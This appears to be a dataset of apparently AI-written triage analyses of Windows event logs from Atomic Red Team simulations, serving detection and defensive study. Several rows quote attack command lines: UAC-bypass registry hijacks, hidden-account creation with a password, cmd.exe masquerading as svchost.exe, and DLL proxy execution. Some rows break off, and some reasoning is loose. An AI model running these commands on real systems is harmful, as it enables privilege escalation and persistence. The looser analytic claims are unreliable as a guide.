   - The integrity level marked as ""High"" for several processes suggests these are privileged operations, consistent with admin-level actions.

Given the outlined suspicious and anomalous behavior, there are clear indicators of potentially malicious activity. The clearing of multiple logs, particularly with the intent to hide activity, alongside command executions modifying security permissions, supports the inference of compromise.

**Resolution: MALICIOUS**

**Guidance on Proceeding:**
- Immediate action is necessary to secure the system and prevent further potential misuse. This could involve isolating the host from the network, performing a full forensic analysis to uncover further malicious actions, and checking for other compromised systems.
- Investigate the source and intent of the suspicious actions performed by `admin_test`, and consider resetting credentials or revoking access until the investigation is concluded.
- Enhance monitoring and implement tighter security controls to prevent unauthorized log clearing and privilege escalations in the future."
InstallUtil Uninstall method call - -installtype=notransaction -action=uninstall' variant,"Based on the analysis of the provided logs, there are several indicators of potentially suspicious and malicious activities:

1. **Event Log Clearing**: 
   - Security Event ID 1102, indicates that the security event log was cleared by the user `admin_test`. Clearing event logs is a common technique used by attackers to cover their tracks after gaining unauthorized access to a system. 
   - System Event ID 104, shows similar log-clearing action on the System and Windows PowerShell logs by the same user.

2. **PowerShell Execution**: 
   - Multiple PowerShell events (Windows PowerShell Event ID 600) indicate the execution of a script related to `AtomicRedTeam`, specifically `InstallUtilTestHarness.ps1` located in a temporary directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.004\\src\\`. This execution includes devious command line arguments typically associated with test harness scripts used in red team activities, a simulation of attacks for testing security postures, or for actual malicious activities.
   - The use of Atomic Red Team artifacts in a live system scenario without known authorization could indicate potential misuse for malicious purposes, particularly if these are not routine security testing activities in this environment.

3. **Sysmon Log Activities**:
   - Multiple invocations of `wevtutil.exe`, a command-line utility for managing and reading event logs, immediately following the log clearance event, suggest an attempt to manipulate or view event logs which is a suspicious behavior if not conducted by authorized personnel for legitimate reasons.
   - The `InstallUtil.exe` process execution with an unusual command line that includes `/action=uninstall` directed towards a DLL in a temporary folder is known to be an indicator of attack technique (specifically `T1218.004`) which is leveraged for executing arbitrary code.

4. **Edge Update Service Activities**:
   - The EdgeUpdate processes executed with parameters (`/regsvc`, `/regserver`, etc.) on the NT AUTHORITY\SYSTEM user context indicate update or installation activities. However, entourage and frequency could imply masquerading attempts or exploitation of update services if not originating from legitimate software update activities.

Given these points, the logs exhibit clear indications of suspicious and potentially malicious activities:

- **SUSPICIOUS**: Due to the utilization of Atomic Red Team scripts and suspicious command line usages that are often associated with red team simulation or malicious activities, combined with event log clearance indicating potential attempts to cover tracks.

**Recommended Actions**:
- Verify if any authorized red team or internal security testing activities were active during this time. If none were scheduled, escalate the situation as potentially malicious.
- Investigate the source of the PowerShell script execution, its presence, and execution environment. Verify its legitimacy or potential compromise.
- Check for any unauthorized changes or suspicious activities on the server.
- Review user `admin_test`'s activities, privileges, and access patterns.
- Update endpoint monitoring and alerting rules to detect similar patterns.

In conclusion, escalate this incident to the security response team for immediate investigation and remediation of identified threats."
Register-CimProvider - Execute evil dll,"### Analysis of the Logs:

1. **Log Clearing Activity:**
   - The security log shows an event with EventID 1102 indicating that the security log was cleared by a user named `admin_test` on `Server002`. 
   - The sysmon log and system log show several instances where the `wevtutil.exe` command was used to clear event logs, specifically the Security, Application, and System logs. This was executed by the user `SERVER002\admin_test`. 
   - Clearing of logs is often an indicator of malicious activity, as it is a method used by attackers to hide their traces. 

2. **Suspicious Command Execution:**
   - There is a potentially suspicious command executed via `cmd.exe` to run `Register-CimProvider.exe` with a DLL from the Atomic Red Team suite. This suggests that a Red Team tool or potentially malicious activity was executed as it is commonly used for penetration testing and can be contextually benign or suspicious depending on the environment context.
   - The command executed was: `""cmd.exe"" /c C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218\\src\\Win32\\T1218-2.dll""`.
   
3. **Use of Administrative Tools:**
   - We also see legitimate Windows binaries (`wevtutil.exe`, `whoami.exe`, etc.) being run with high integrity level, under the same admin user context `SERVER002\admin_test`.

4. **Context of Microsoft Edge Update Activity:**
   - The logs also contain multiple entries regarding Microsoft Edge Update processes (e.g., MicrosoftEdgeUpdate.exe). These processes run under the `NT AUTHORITY\SYSTEM` account, suggesting a scheduled or manual update, which is generally benign in nature.

### Assessment of the Situation:

- The combination of clearing event logs and executing potentially harmful commands under administrative privileges is highly suspicious.
- While the Microsoft Edge Update activities are normal for system updates, the context of other events occurring nearly simultaneously adds concern for potential activity obfuscation.

### Resolution: 

Given these observations:
- **Resolution: MALICIOUS** - The combination of log clearing (an IOC for potential compromise) and suspicious command execution from a known Red Team suite, combined with the administrative context and lack of legitimate reason provided for these actions, indicate a strong likelihood of malicious intent or activity.

### Guidance on How to Proceed:

1. **Containment:**
   - Immediately isolate the affected host from the network to prevent further access or lateral movement by any potential adversaries.

Disable Windows Remote Desktop Protocol,"Upon analyzing the provided Windows event logs, several events catch attention:

### Suspicious Activities:

1. **Clearing of Event Logs**: 
   - **System, Windows PowerShell, and Security Logs Cleared**: Multiple instances of log clearing are evident (Event ID 104 from the System log, Event ID 1102 from the Security log). This action is often associated with an attempt to cover up malicious activities on the system. The user 'admin_test' appears to be involved in clearing these logs.

2. **Registry Modification**:
   - **Registry Change via CMD**: There is a command execution involving `cmd.exe` carrying out a registry change to disable remote desktop connections (`fDenyTSConnections`). The command utilized is: `""cmd.exe"" /c reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f`.
   - **Separate `reg.exe` Execution**: Follow-up to the cmd execution shows `reg.exe` applied the same registry change indicating an automated task could have been set for this action.

3. **Process Activities Related to Logs and Conditions**:
   - **Wevtutil Executions**: The `wevtutil.exe` tool appears numerous times with the context of clearing event logs (Security, System, Application) typically right before or after logs are cleared, indicating programmatic log manipulation.

4. **EdgeUpdate Executions**: A sequence of EdgeUpdate service executions could be legitimate but are worth a deeper inspection to ensure no unusual temporal alignment with the above activities.

5. **Time Change Events**: 
   - There are kernel events indicating time change adjustments (Event ID 4616 in Security logs), which can sometimes be linked with covering tracks or ensuring timeliness of tasks in correlation with log manipulations.

### Assessment:

These indicators collectively suggest suspicious activities:

- The log clearing operations, coinciding registry changes, and unexplained instance of common tools used in compromising workflows (such as `wevtutil`, `cmd`, and `reg`) are all strong signs of potential malicious maneuvering aiming to hide tracks.

### Recommendation:

- **Resolution**: **Suspicious** - Further investigation is necessary to confirm whether these activities are benign administrative actions or indicators of compromise. 

### Guidance:

- **Isolate** the affected host to prevent potential lateral movement.
- **Investigate** user 'admin_test' activities and credentials—ensure there is no unauthorized usage or credential compromise.
- **Check for Anomalies on the Network or Other Systems** potentially indicating broader activity.

"
Headless Browser Accessing Mockbin,"Based on the provided Windows event logs, I have analyzed various entries for indicators of malicious activity. Here is a detailed analysis:

1. **Security Log Analysis:**
   - **Event ID 1102 (Log Cleared):** The security log was cleared by user `admin_test`. This action may suggest attempts to cover tracks, as it is often associated with malicious activity to hide evidence.
   - **Event ID 4672 (Assign Special Privileges):** Multiple privilege assignments to `SYSTEM` and `admin_test`, which include powerful privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. This is noteworthy as it could indicate privilege escalation attempts or activities requiring elevated access.
   - **Event ID 4624 (Logon Event):** There were several logon events using different client IP addresses. Notably, `admin_test` logged in using NTLM authentication from a workstation `DESKTOP-3HL5B2P` with IP `192.168.0.102`.

2. **System Log Analysis:**
   - **Event ID 104 (Log Cleared):** Similar to the security log, clearing of system logs by `admin_test` could indicate an attempt at concealing activities. It was carried out within seconds of the security log clearance.

3. **PowerShell Log Analysis:**
   - **PowerShell Execution:** PowerShell was executed under high privilege, performing operations like writing host outputs and potentially scanning for certain patterns in files (`Get-Content $Inf.FullName`). Executing PowerShell with restricted policies and the mentioned operations raises suspicion about automated or scripted activities.

4. **Sysmon Log Analysis:**
   - **Command Execution (Sysmon Event ID 1):** There are records of command-line utility `cmd.exe` executing `chrome` in headless mode accessing a URL (`mockbin.org`). The use of headless browsers in PowerShell scripts could be a method for automated browsing, scraping, or malware delivery.
   - **Process Conducts (Sysmon Event ID 1 and 5):** Frequent execution of system utilities like `wevtutil.exe`, `conhost.exe`, and process spawning by `CompatTelRunner.exe`. Such activities may be administrative; however, they raise concern due to their volume and potential misuse.
   - **EdgeUpdate:** There is a significant amount of Edge Update activity, which might be legitimate system updates. However, the volume and use of system privileges should be further verified to ensure there are no covert activities.

**Threats and Risks Identified:**
- **Activity Concealment Risk:** The clearing of event logs in both security and system channels by `admin_test`.
- **Potential Suspicious Script Execution:** PowerShell activities under high privilege with non-default execution policies suggest potentially malicious script execution.
- **External Connection and Resource Access:** Web access using command line utilities from PowerShell like executing browsers in headless mode point to possible external data exfiltration or download of malicious content.

**Guidance on How to Proceed:**
1. **Immediate Inspection of `admin_test`:** Review account history, permissions, and conduct interviews if possible.
2. **Examine Network Traffic:** Particularly outbound connections made by processes like `cmd.exe` and any headless browser sessions.
3. **Detailed File Integrity Check:** On the system to identify any unauthorized changes or uploads/downloads that may have occurred.
4. **Implement Enhanced Monitoring:** Activate more detailed logging on suspicious accounts and processes to catch future anomalous activities.
5. **Incident Response:** If further investigation uncovers definite malicious actions, escalate this matter to the Incident Response Team for containment and further analysis.

**Resolution: SUSPICIOUS**
The activities observed are suspicious due to potential malicious indicators like log clearing, PowerShell usage policy violations, and possible external engagements. Further investigation is warranted to determine the true intent and scope of the actions taken on this host."
Bypass UAC using ComputerDefaults (PowerShell),"Upon reviewing the provided logs, I've identified several indicators that point towards potential malicious activity, as well as benign actions.

### Analysis:

**1. Application Log:**
   - Events from the `SecurityCenter` show Windows Defender being active (`SECURITY_PRODUCT_STATE_ON`). No suspicious activity here; it's routine logging.

**2. PowerShell Log:**
   - Repeated entries demonstrating the use of PowerShell to modify registry keys under `HKCU:\software\classes\ms-settings\shell\open\command`. 
   - The PowerShell script shows commands to:
     - Create a new registry item.
     - Assign `cmd.exe` as the default execution value.
     - Start the `ComputerDefaults.exe` process.
   - This type of activity is often associated with an exploitation technique intended to bypass system restrictions by hijacking COM classes or altering command execution paths, suggesting privilege escalation or persistence attempts.

**3. Sysmon Log:**
   - Entries of `wevtutil.exe` being used to clear event logs (evidence of event ID 104 in the System and Security logs). Clearing logs is a technique used to hide malicious activity.
   - The `PowerShell.exe` process with the same command from above confirms execution—potential unauthorized changes to the system settings for escalation or lateral movement. 
   - Frequent execution of `conhost.exe`, driven by processes like `wevtutil.exe`, is suspicious as it often accompanies manipulation of log files.

**4. Security Log:**
   - Event ID 1102, which indicates security log clearing, is a major red flag associated with malicious attempts to cover tracks.
   - Privilege-level processes executed with high integrity (indicated by the presence of numerous SePrivileges) could point towards privilege escalation activities.

**5. System Log:**
   - Log file clearing events (Event ID 104) for critical channels including `System` and `Windows PowerShell`. Indicates an attempt to cover up actions possibly linked to unauthorized or malicious activity.

### Conclusion:
Based on the evidence gathered from PowerShell scripts altering execution paths, the use of `wevtutil` for clearing logs, and indications of possible privilege escalation, it is highly indicative of malicious actions.

### Resolution:
**MALICIOUS** - The logs strongly indicate malicious activity. Immediate action is advised to contain and remediate the threat including isolating the affected system, conducting a full forensic investigation, and reviewing configurations to prevent further compromise."
Masquerading - windows exe running as different windows exe,"The review of the Windows event logs reveals several suspicious activities that indicate potential malicious activity. Here's a breakdown of the analysis:

1. **Clearing of Event Logs**:
   - **System Log `EventID 104`** and **Security Log `EventID 1102`**:
     - The logs show multiple instances of logs being cleared (`LogFileCleared`). This behavior, especially conducted by the same user account `admin_test`, raises a red flag as it's a common technique used to cover tracks after illicit activities.

2. **Suspicious PowerShell Activity**:
   - **Sysmon `EventID 1` and PowerShell Logs**:
     - A PowerShell command is executed using `powershell.exe` with a suspicious command line: `& {copy \""$env:ComSpec\"" ($env:TEMP + \""\\svchost.exe\"")...}`.
     - The command is using the `comspec` environment variable to copy CMD.EXE as `svchost.exe` into a temporary location and execute it. Such behavior is indicative of attempts to camouflage malicious scripts or processes, potentially related to masquerading or evasion techniques.

3. **Execution of a Potentially Malicious svchost.exe**:
   - **Sysmon** entry shows:
     - `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\svchost.exe` was executed, which is not standard behavior for legitimate `svchost.exe` processes that should normally run from `C:\\Windows\\System32`.
     - The hash `SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0` should be cross-referenced with known malware databases to verify its integrity.

4. **Potential Privilege Escalation and Masquerading**:
   - The use of tools like `wevtutil.exe` to manipulate logs and PowerShell for execution of hidden commands indicates an attempt to escalate privileges or maintain stealth on the system.

5. **Normal System Update**:
   - Logs indicating Windows Update Client activities and updates for Microsoft Defender are part of normal operations and appear benign.

**Assessment and Resolution**: The activities, especially the clearing of logs and the suspicious PowerShell command execution, strongly suggest steps taken to disguise potentially malicious activities. The execution of a possible masqueraded `svchost.exe` further points toward compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the affected host to prevent further spread or data exfiltration.
- Perform a comprehensive scan with up-to-date anti-malware solutions to remove any known threats.
- Review and possibly reset user credentials involved, especially for `admin_test`.
- Implement monitoring for anomalous log clearances and unauthorized PowerShell activities.
- Engage incident response teams to conduct a full forensic investigation to understand the breach's scope and origin.
- Harden the system, including patching and ensuring least privilege access controls are enforced."
WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"### Analysis of the Windows Event Logs

**Overview:**
The logs provided indicate activity centered around the execution of PowerShell commands that relate to the Atomic Red Team, a well-known framework used for simulating adversary techniques. Several event logs stand out as potentially suspicious, especially regarding PowerShell script execution and the clearing of event logs, a common practice to cover tracks.

**Suspicious or Anomalous Behavior Observed:**

1. **PowerShell Execution:**
   - The use of `Invoke-CimMethod` to install an MSI package located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.007\bin\T1218.007_VBScript.msi`) suggests an attempt to execute a one-off or testing-related task. This is typically not a standard operational action.
   - Command seen: `powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_VBScript.msi' }}`.

2. **Execution Context:**
   - The use of the `-nop` flag with PowerShell indicates an attempt to bypass initialization scripts, again typical of malicious activities.
   - Command seen: `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -Command Write-Host VBScript executed me!; exit`.

3. **Log Clearing:**
   - Several event clearing logs (Event ID 1102 in the Security log and Event ID 104 in the System log) are noted, which is a red flag as attackers often clear event logs to remove traces of their activity.
   - The logs show `admin_test` as the user performing these actions, which could suggest either a compromise of this user account or insider activity.

4. **Sysmon Events:**
   - Multiple Sysmon logs (Event ID 1, process creation) indicate processes such as `wevtutil.exe` being executed to clear event logs for multiple channels.
   - The handling of log files using wevtutil with command lines like `""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""` indicates attempts to clear logs.

UACME Bypass Method 23,"### Detailed Analysis of the Logs

Upon examining the provided event logs, several entries stand out as potentially suspicious and indicative of malicious activity:

#### 1. **Clearing of Event Logs**

- **Security Log (Event ID 1102)**
  - The security log was cleared by a user named ""admin_test"". Clearing security logs is often an attempt to cover one's tracks after malicious activity, particularly if performed by an account with elevated privileges.

- **System Log (Event ID 104)**
  - The system log was also cleared by the same user, ""admin_test"". This behavior is similarly indicative of attempts to hide activity that may compromise the system's security.

#### 2. **Execution of Potentially Suspicious Commands**

- **Sysmon Log (Event ID 1 and 5)**
  - There are several suspicious command executions involving `cmd.exe` and `PowerShell.exe`. Notably, the `cmd.exe` process executed a command pointing to `Akagi64.exe`, which appears to be a potential malicious payload being executed from a temporary directory.
  - The execution path includes directories and executable names commonly associated with User Account Control (UAC) bypass techniques (e.g., `ExternalPayloads\\uacme\\23 Akagi64.exe`), suggesting potential privilege escalation attempts.

- **Sysmon Log** for `wevtutil.exe` (Event ID 1 and 5)
  - Multiple entries show `wevtutil.exe` being used with the ""cl"" (clear) command, targeting various log channels. This is again consistent with attempts to cover tracks by clearing event logs. This command's execution further supports the theory of malicious activity attempting to hide its traces.

#### 3. **Tools and Techniques**

- The presence of Atomic Red Team directories and the execution of `uacme` suggest this activity may be part of a red team exercise or a compromise using known adversarial tools for evasion and privilege escalation, as these tools are commonly used for demonstration and testing of security postures.

### Assessment of the Situation

- **Indicators of Malicious Activity**: The activities of clearing logs and running known tools for privilege escalation are highly indicative of malicious activity, particularly given the lack of routine activity logs to justify such actions.
  
- **Potential Threats/Risks**: The compromised system could be at risk of further exploitation, data exfiltration, or additional malware installation, given the apparent use of credentialed access for administrative actions consistent with adversarial tactics.

### Guidance on How to Proceed

1. **Immediate Response**:
   - Isolate the system from the network to prevent further potential spread or data exfiltration.
   - Conduct a full forensic investigation to determine the extent of the compromise and any data breaches.

2. **Long-Term Actions**:
   - Review and adjust security policies to include stricter logging access and monitoring.
   - Heighten user training and awareness regarding phishing and unauthorized software usage.
   - Review administrative account privileges and consider implementing multi-factor authentication.

3. **Further Investigation**:
   - Perform a memory analysis and disk analysis to identify additional traces of malicious activity or undetected malware.

### Resolution
- **Resolution**: MALICIOUS

The presence of log clearing activities, use of known adversarial tools, and potentially unauthorized elevation of privileges strongly indicate malicious intent and activity."
Create a Hidden User Called $,"Upon analyzing the provided Windows event logs, the following observations have been made:

### Analysis

1. **Log File Clearing Events:**
   - The system and PowerShell event logs were cleared by the user `admin_test`:
     - **System Log (Event ID 104):** Event logs from the System channel were cleared.
     - **Windows PowerShell Log (Event ID 104):** Logs from the Windows PowerShell channel were cleared.
     - **Security Log (Event ID 1102):** Security log was cleared.
   
   Clearing these logs is suspicious as it can be an indication that someone is trying to hide their tracks.

2. **Account Activity:**
   - **Security Events:**
     - **Event ID 4720:** A new account named `$` was created. The command used appears to include non-standard characters and naming conventions (using `$` for a username).
     - **Event ID 4738:** This indicates changes to an account, specifically on the account named `$`.
     - **Event ID 4724:** Indicates a password reset was attempted for the account `$`.

3. **Command Line Activity:**
   - A notable command was executed using `cmd.exe`:
     - `cmd.exe /c net user $ ATOMIC123! /add /active:yes`: This command adds a new user account `$` with the password `ATOMIC123!` and sets it to active.
   
4. **Process Execution:**
   - The processes include the use of `conhost.exe` and `wevtutil.exe`, which are consistent with actions related to event log clearing (`wevtutil` is used for management of Event logs and can be used to clear logs), and they are executed under the `admin_test` account.
   - The use of `whoami.exe` and `hostname.exe` appears, which could be normal but in the context of the other activities indicates surveillance or information gathering.

5. **Privilege Escalation Indicators:**
   - **Event ID 4728, Event ID 4732:** These indicate group membership changes (e.g., adding user to Admin groups) but the details provided are anonymized. However, the presence of these events immediately after the user creation and log clearing is concerning.

### Assessment

The logs indicate a sequence of activities that align closely with common tactics used in malicious campaigns, especially with the creation of suspicious user accounts, the clearing of logs, and the execution of certain commands under a high-privileged account. The concurrent clearing of multiple event logs, the creation of an unusual account name, and the absence of legitimate context for these actions raise significant red flags.

### Resolution

Based on the analysis above, the activity observed within these logs is classified as:
- **MALICIOUS**

### Guidance on How to Proceed

1. **Incident Response:**
   - Immediate isolation of the affected host `Server002` to prevent further potential compromise.
   - Conduct a thorough forensic analysis to capture the current state of the system and identify any additional indicators of compromise.

   - Identify and remove any unauthorized accounts or malicious software identified during the investigation.
   - Apply security patches and updates to cover any exploited vulnerabilities.

4. **Recovery & Lessons Learned:**
   - Restore the system from a known clean backup.
   - Implement advanced monitoring and alerting mechanisms for unusual activities, such as log clearing or account management.
   - Review and enhance security policies regarding user account management, logging, and audit trails."
WinPwn - UAC Bypass DiskCleanup technique,"Upon reviewing the provided Windows event logs, here is a detailed analysis based on the content found:

### Summary and Analysis:
1. **Security Log (Event ID 1102 and 4616):**
   - **Event ID 1102:** This event indicates that the audit log was cleared, which is suspicious, especially if unexpected, as attackers often clear logs to cover their tracks.
   - **Event ID 4616:** A change in system time was logged. While not necessarily malicious, combined with other suspicious activities, it might indicate an attempt to manipulate time-based security features.

2. **Windows PowerShell Log:**
   - A PowerShell script from `https://github.com/S3cur3Th1sSh1t/WinPwn` was executed. This script is known for exploitation and privilege escalation efforts. The use of `UACBypass -noninteractive -command ""C:\\windows\\system32\\cmd.exe"" -technique DiskCleanup` shows an attempt to bypass User Account Control (UAC), which is highly indicative of malicious activity.

3. **System Log:**
   - **Event ID 104:** The logs for various Windows channels, including System, Application, and Windows PowerShell, were cleared. This action is in line with typical adversarial behavior post-compromise to erase traces of their presence.

4. **Sysmon Log:**
   - Multiple instances of `wevtutil.exe cl` commands, which clear event logs, were executed. The process hierarchy and command line suggest it was done by `admin_test` with high integrity, resembling potential misuse of administrative privileges.
   - Execution of suspicious processes such as the PowerShell command for downloading and executing scripts from a public repository, potentially part of a reconnaissance or post-compromise activity.
   - Multiple commands executed with high integrity in rapid succession (hostname, whoami) which is consistent with penetration testing or active exploitation.

### Assessment:
The behaviors observed across various logs, such as log clearing, script execution from a known exploit repository, and attempts to execute techniques that bypass security controls, strongly suggest a compromise has occurred. The combination of these activities represents a pattern of malicious behavior typically associated with an attacker’s post-exploitation phase, aiming to escalate privileges, gather intelligence, and persist within the network.

### Resolution:
- **MALICIOUS**: Based on clear indicators of malicious intent such as log clearing behaviors, PowerShell usage for potential UAC bypass and privilege escalation, and the execution of exploitation scripts from an external repository.

### Recommendations:
- **Immediate Actions:**
  - Isolate the affected host (Server002) from the network to prevent further lateral movement.
  - Conduct a full forensic investigation to determine the extent of the compromise and identify any additional compromised assets.
  - Review and reset credentials for accounts potentially involved, especially `admin_test`.

- **Follow-up Actions:**
  - Apply security patches and ensure that all systems are up to date.

Copy and Modify Mailbox Data on Windows,"Based on the provided logs, here is the detailed analysis of potentially suspicious activities:

### Application and PowerShell Logs:

1. **PowerShell Execution:**
   - The logs indicate a PowerShell script was executed with a series of commands to create directories, copy files, and modify content within user directories located at `C:\Users\<USERNAME>\AppData\Local\Comms\Unistore\data`. The comment ""Modification for Atomic Red Test"" indicates that this was potentially a benign simulated attack conducted for testing purposes, often referred to as Atomic Red Team tests.
   - PowerShell executions manipulating user data directories and appending to files, even for testing, should be scrutinized. However, given the clear indication of a test, this particular instance seems to have a legitimate testing purpose.

### Security Logs:

2. **Event Log Clearing:**
   - The Event ID 1102 indicates ""The audit log was cleared,"" which is a significant red flag typically associated with attempts to cover tracks after unauthorized activities. The action was performed by a user named `admin_test`.

3. **Time Change Events:**
   - Event ID 4616 indicates that the system time was changed. While legitimate time changes can occur, combined with log clearing, this could attempt to obfuscate the timeline of events.

### Sysmon Logs:

4. **Execution of Eventing Utility (`wevtutil.exe`):**
   - Multiple instances of `wevtutil.exe` executing commands to clear event logs such as Application, System, and Security logs were observed. This correlates with the Security log entry (Event ID 1102) indicating log clearing. 
   - The execution of `wevtutil.exe` for log clearance is a common malicious activity aimed at covering tracks.

### System Logs:
5. **Log Clearing:**
   - Alongside the security log clearing, both System (`104` EventID) and Windows PowerShell logs were also cleared, as indicated by entries in the System logs. This further supports potential obfuscation activities.

### Assessment:

- **Indicators of Potential Malicious Activity:**
  - PowerShell activity modifying user data files points to suspicious behavior, common in penetration testing.
  - Event log clearing (Application, System, Windows PowerShell, Security) suggests an attempt to hide actions taken on the host.
  - System time change in close sequency to other suspicious activities is another potential indicator of malicious intent.

Given the combination of PowerShell test indications and serious actions such as event log clearing by `admin_test`, the activities seem suspicious even if part of a penetration test. Without further context regarding whether this was an authorized test, this cannot be deemed entirely benign.

### Resolution:

- **SUSPICIOUS**: The set of actions observed (e.g., event log clearing, system time changes) alongside test indications necessitate further investigation to confirm if authorized testing took place or if these activities were indeed malicious. Immediate action would involve validating the legitimacy of the testing activities and reviewing access logs for the account `admin_test`.

### Recommendation for Further Steps:
- Verify with the IT or security team if an Atomic Red Team or any other penetration testing was authorized and scheduled.
- Check for additional logs or audit data around the time of these activities to gather more context on the `admin_test` account.
- If unauthorized, initiate an incident response protocol to handle potential compromise."
Windows Add Registry Value to Load Service in Safe Mode without Network,"Upon reviewing the event logs from the Windows host provided, I have identified several key points and potential indicators of possible malicious activity:

1. **Log File Clearing:**
   - Multiple Event Logs (Event ID: 104) from the System log indicate that the logs for the System and Windows PowerShell channels were cleared by a user named ""admin_test"" on the machine ""Server002"". 
   - The clearing of logs, especially by a user who may not be expected to perform such actions, can be a significant indicator of malicious activity, either to cover tracks or potentially tamper with evidence.

2. **Usage of Wevtutil:**
   - The Sysmon logs show the execution of `wevtutil.exe` to clear logs, which corroborates with the Event ID 104 entries mentioned. 
   - The syntax of the command `wevtutil.exe cl [ChannelName]` is commonly associated with attempts to erase evidence or manipulate the logs.

3. **Suspicious Registry Modifications:**
   - There is an execution of `cmd.exe` followed by `reg.exe` for modifying registry entries related to SafeBoot options (`REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode""`). 
   - This kind of registry modification can indicate an attempt to establish persistence or modify system boot settings potentially maliciously.

4. **Time Change Events:**
   - There are Security Audit logs (Event ID: 4616) indicating a change in the system time by the `svchost.exe` process. While time synchronization can be benign, unauthorized or abrupt changes can suggest tampering.

5. **High Privilege Activity by a User on a Non-Standard Session:**
   - Many processes, including system utility executions by the ""admin_test"" account, have a high integrity level. The context and scope of actions, especially combined with log clearing, are suspicious.

6. **Microsoft Edge Update Activities:**
   - There are several entries around Microsoft Edge Update processes. However, this seems normal and benign, indicating routine application updates executed by the system.

- Consider isolating the affected system from the network until a comprehensive investigation has been completed to prevent potential lateral movement by an attacker."
Rundll32 execute command via FileProtocolHandler,"After analyzing the provided Windows event logs, the following suspicious and potentially malicious activities have been identified:

1. **Log File Clearing**:
   - System logs indicate that the event logs have been cleared multiple times in quick succession (EventID 104 and 1102 in the system and security logs). The clearing of event logs, especially without backup, is a common tactic to cover tracks of malicious activities.

2. **Wevtutil.exe Execution**:
   - The Sysmon logs show executions of `wevtutil.exe` with the command-line argument to clear specific event logs (""cl"" stands for clear), applied to the System, Security, and PowerShell event logs. This further corroborates suspicious activities attempting to erase system traces.

3. **Unusual Command Execution**:
   - The execution of `cmd.exe` with the command ""rundll32.exe url.dll,FileProtocolHandler calc.exe"" is notable (Sysmon logs). This pattern is often associated with attempts to execute hidden payloads or commands through seemingly legitimate processes.

4. **Scheduled Task Creation or Manipulation**:
   - Cmd.exe, wevtutil.exe, and conhost.exe are seen executing in rapid succession and are frequently associated with executing or concealing malicious commands and usages, especially with rundll32 and the clearing of logs.

5. **Potential Privilege Escalation**:
   - Activities are being executed under the administrative or SYSTEM context, which is suspicious, especially when combined with the actions of erasing logs and executing command-line operations.

**Assessment**: 

The combination of cleared logs, use of wevtutil for log clearing, and execution of suspicious command-line arguments indicates highly suspicious activity. The actions appear to be done to erase tracks potentially left by malicious activities.

**Resolution**: MALICIOUS

- Preserve all system logs, including any potential backups, and cross-reference time stamps and actions for additional context and correlation.
- Conduct a thorough investigation to identify any additional indicators of compromise (IoCs) on the system.
- Evaluate system integrity, including system files and any modified or newly introduced binaries.
- Review user activity and authorization controls to identify how administrative privileges were misused or obtained.
- Communicate with your team and stakeholders about potential next steps regarding containment, eradication, and recovery measures."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"Based on an analysis of the provided Windows event logs, several indicators point to potentially suspicious and possibly malicious activity. Here's a detailed breakdown of the events:

1. **Application Logs:**
   - The installation of ""Atomic Red Team Test Installer"" is noted (Events with IDs ""1040"", ""11707"", ""1033""). Atomic Red Team is a well-known toolset for testing security monitoring and detection mechanisms. The fact that it's being installed on this system raises suspicion. The execution of VBScript files from the Temp directory (C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.007\bin\T1218.007_VBScript.msi) is indicative of testing or potentially exploiting system vulnerabilities.

2. **Security Logs:**
   - Event ID ""1102"" indicates that the security log was cleared. Log clearing is a commonly employed technique to cover up malicious activity. This event itself is highly suspicious.

3. **System Logs:**
   - There are entries indicating the clearing of event logs for the System and Windows PowerShell channels (Event ID ""104""). This behavior is unusual and typically suspicious, aligning with activities to hide evidence of malicious actions.

4. **PowerShell Logs:**
   - The command-line arguments in PowerShell execution (""powershell.exe -nop -Command Write-Host VBScript executed me; exit"") suggest obfuscation or anti-forensic behavior, possibly testing or delivering small payloads via scripts. The use of the ""-nop"" (No Profile) flag is often used in malicious PowerShell scripts to execute without loading the user profile, which could hint at stealth operation.

5. **Sysmon Logs:**
   - Multiple uses of ""wevtutil.exe"" to clear various event logs (Sysmon Event IDs: ""17960"", ""17964"", ""17968"") match the behavior seen in System logs and confirm the action of event log clearing. The association with a user account, SERVER002\admin_test, executing these actions under high integrity levels, further link suspicious human actions or scripted automation to disguised administrative tasks.
   - Additionally, ""powershell.exe"" and ""msiexec.exe"" instances tied to the Atomic Red Team activities show direct execution linked to possibly nefarious test operations.

**Conclusion:**
The collected evidence strongly indicates suspicious activity, largely consistent with penetration testing by the Atomic Red Team framework, which can also simulate potentially malicious activities. The clearing of logs and the use of PowerShell with obfuscation flags are key risk indicators.

**Resolution: SUSPICIOUS**
Further investigation is warranted to understand if these activities were authorized penetration tests or have elements of genuine compromise. It's imperative to verify legitimacy:
- Confirm the legitimacy of any scheduled or authorized security testing operations.
- Review user account actions and permissions associated with log-clearing activities.
- Deploy additional monitoring to capture any ongoing similar activities.
- Secure the system against further unverified installations and executions."

### Detailed Analysis:

1. **Time Alteration Event:**
   - There is a **time change logged** by `svchost.exe`. Time change events in logs (EventID: 4616) can be used by attackers to cover their tracks.
   - This event should be further investigated to determine if it was a legitimate system activity or indicates an attempt to hide actions.

2. **Event Log Clearing:**
   - Observing EventID: 104, there are **multiple entries indicating the clearing of event logs** (System, Windows PowerShell, and Security logs) by the user `""SERVER002\\admin_test""`. 
   - The clearing of event logs is a common indicator of malicious activity as it often aims to erase evidence of unauthorized actions.

